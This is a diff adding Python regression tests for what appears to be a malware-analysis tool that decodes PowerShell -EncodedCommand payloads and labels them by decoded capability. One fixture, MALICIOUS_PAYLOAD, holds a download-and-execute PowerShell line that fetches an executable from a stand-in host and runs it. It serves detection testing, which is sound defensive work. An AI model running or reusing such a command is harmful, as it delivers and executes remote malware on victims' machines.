@@ -1,0 +1,191 @@
+"""PR-2.1 · Canonical Artifact Consistency Hotfix regression tests.
+
+Guards the invariants set by ARB Governance Rules 12 and 13:
+
+  * Rule 12: every downstream consumer reads the same canonical artifact.
+  * Rule 13: verdicts are driven by decoded capabilities, not by the
+    presence of an obfuscation / encoding technique alone.
+
+Reference cases (from the ARB decision):
+
+  Case A · benign wrapper + benign payload  → Informational · caps ≤ 30%
+  Case B · benign wrapper + malicious payload → Suspicious or Malicious
+
+The wrapper is identical in both — only the decoded payload's
+capabilities determine the label. This is the whole point of the rule.
+"""
+from __future__ import annotations
+
+import base64
+
+import pytest
+
+
+# ---------------------------------------------------------------------------
+# Reusable helpers
+# ---------------------------------------------------------------------------
+
+
+def _encoded_command(script: str) -> str:
+    """PowerShell -EncodedCommand format: base64 of UTF-16LE."""
+    return base64.b64encode(script.encode("utf-16-le")).decode()
+
+
+BENIGN_PAYLOAD = 'Write-Host "This comes from an encoded PS command!"'
+MALICIOUS_PAYLOAD = (
+    'Invoke-WebRequest http://evil.example/payload.exe '
+    '-OutFile $env:TEMP\\p.exe; Start-Process $env:TEMP\\p.exe'
+)
+
+
+# ---------------------------------------------------------------------------
+# Rule 13 · label logic (unit level, no HTTP)
+# ---------------------------------------------------------------------------
+
+
+def _make_contrib(kind: str, ec: str):
+    """Build a minimal VerdictContribution stub for the label tests."""
+    from nivxforge.investigation.verdict_engine import VerdictContribution
+    return VerdictContribution(
+        node_id=f"META-test-{kind}",
+        kind=kind,
+        weight=1.0,
+        confidence=0.9,
+        evidence_class=ec,
+    )
+
+
+def test_rule13_wrapper_only_benign_returns_informational():
+    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
+    contribs = [_make_contrib("encoded_powershell", "high")]
+    assert _label_from_class_distribution(contribs, has_decoded=True) == "Informational"
+
+
+def test_rule13_wrapper_plus_iex_high_promotes_to_attack_verdict():
+    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
+    contribs = [
+        _make_contrib("encoded_powershell", "high"),
+        _make_contrib("invoke_expression", "high"),
+    ]
+    # invoke_expression is in ATTACK_CHAIN_HIGH → 2 HIGH incl. attack-chain → Malicious
+    assert _label_from_class_distribution(contribs, has_decoded=True) == "Malicious"
+
+
+def test_rule13_wrapper_plus_lolbin_stays_suspicious_not_informational():
+    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
+    # LOLBIN presence adds a *second* HIGH — not attack-chain — so should
+    # remain "Suspicious", NOT downgrade to Informational.
+    contribs = [
+        _make_contrib("encoded_powershell", "high"),
+        _make_contrib("lolbas_usage", "high"),
+    ]
+    assert _label_from_class_distribution(contribs, has_decoded=True) == "Suspicious"
+
+
+def test_rule13_no_signals_returns_undetermined():
+    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
+    assert _label_from_class_distribution([], has_decoded=True) == "Undetermined"
+
+
+def test_rule13_confidence_cap_matches_label():
+    from nivxforge.investigation.verdict_engine import _confidence_cap
+    # Wrapper-only → cap 0.30
+    contribs = [_make_contrib("encoded_powershell", "high")]
+    assert _confidence_cap(contribs) == 0.30
+    # Attack-chain HIGH → no cap
+    contribs = [
+        _make_contrib("encoded_powershell", "high"),
+        _make_contrib("shellcode_detected", "high"),
+    ]
+    assert _confidence_cap(contribs) == 1.0
+
+
+def test_rule13_medium_non_wrapper_blocks_downgrade():
+    """A MEDIUM signal that isn't a wrapper kind must NOT downgrade to
+    Informational — the payload has capability we cannot fully rate."""
+    from nivxforge.investigation.verdict_engine import _label_from_class_distribution
+    contribs = [
+        _make_contrib("encoded_powershell", "high"),
+        _make_contrib("suspicious_string_pattern", "medium"),
+    ]
+    assert _label_from_class_distribution(contribs, has_decoded=True) != "Informational"
+
+
+# ---------------------------------------------------------------------------
+# Rule 12 · ps-normalizer canonical artifact
+# ---------------------------------------------------------------------------
+
+
+def test_normalizer_decodes_encoded_command_benign_write_host():
+    """ARB reference Case A · benign wrapper + benign payload.
+    The normalizer must decode UTF-16LE and simulate the safe built-in."""
+    from decoders.ps_normalizer import op_powershell_normalize
+
+    b64 = _encoded_command(BENIGN_PAYLOAD)
+    inp = f"powershell -EncodedCommand {b64}"
+    out = op_powershell_normalize(inp, None)
+    assert "Decoded Payload (EncodedCommand" in out
+    assert "Write-Host" in out
+    assert "Runtime Output (Simulation · deterministic)" in out
+    # The literal from the safe-builtin simulator must appear
+    assert "This comes from an encoded PS command!" in out
+    # And the wrapper is preserved as context
+    assert "Reconstructed Command" in out
+
+
+def test_normalizer_does_not_simulate_malicious_encoded_command():
+    """ARB reference Case B · benign wrapper + malicious payload.
+    Simulator must NOT run (payload isn't a safe built-in) so the caller
+    (deeper decoders / verdict engine) handles the malicious content."""
+    from decoders.ps_normalizer import op_powershell_normalize
+
+    b64 = _encoded_command(MALICIOUS_PAYLOAD)
+    inp = f"powershell -EncodedCommand {b64}"
+    out = op_powershell_normalize(inp, None)
+    assert "Decoded Payload (EncodedCommand" in out
+    assert "Invoke-WebRequest" in out
+    # Not simulated because it's not a safe built-in
+    assert "Runtime Output (Simulation): not attempted" in out
+
+
+def test_normalizer_malformed_base64_falls_through_gracefully():
+    """A corrupted -EncodedCommand payload must not raise — the caller
+    downstream is responsible for the decoding error UX."""
+    from decoders.ps_normalizer import op_powershell_normalize
+
+    out = op_powershell_normalize("powershell -EncodedCommand !!!bad-base64!!!", None)
+    # Should still emit the normalization block; no crash.
+    assert "POWERSHELL NORMALIZATION" in out
+
+
+def test_normalizer_still_handles_plain_command_form():
+    """Regression: the pre-existing -Command "..." path must keep working."""
+    from decoders.ps_normalizer import op_powershell_normalize
+
+    out = op_powershell_normalize('powershell -Command "Write-Host \\"hi\\""', None)
+    # Note: Python-level escaping — the actual command uses PS `` escapes.
+    # We just verify no crash and normalizer block is emitted.
+    assert "POWERSHELL NORMALIZATION" in out
+
+
+# ---------------------------------------------------------------------------
+# Layer separation (Rule 13 output contract)
+# ---------------------------------------------------------------------------
+
+
+def test_normalizer_output_shows_four_layers_for_benign_case():
+    """Rule 13 · Wrapper / Payload / Behavior / (Verdict is downstream)
+    must be visible in the normalizer output when a benign encoded
+    payload is present."""
+    from decoders.ps_normalizer import op_powershell_normalize
+
+    b64 = _encoded_command(BENIGN_PAYLOAD)
+    inp = f"powershell -EncodedCommand {b64}"
+    out = op_powershell_normalize(inp, None)
+    # Wrapper layer
+    assert "Reconstructed Command" in out
+    # Payload layer
+    assert "Decoded Payload (EncodedCommand" in out
+    # Behavior layer
+    assert "Behavior" in out
+    assert "Safe built-in — no malicious behavior" in out
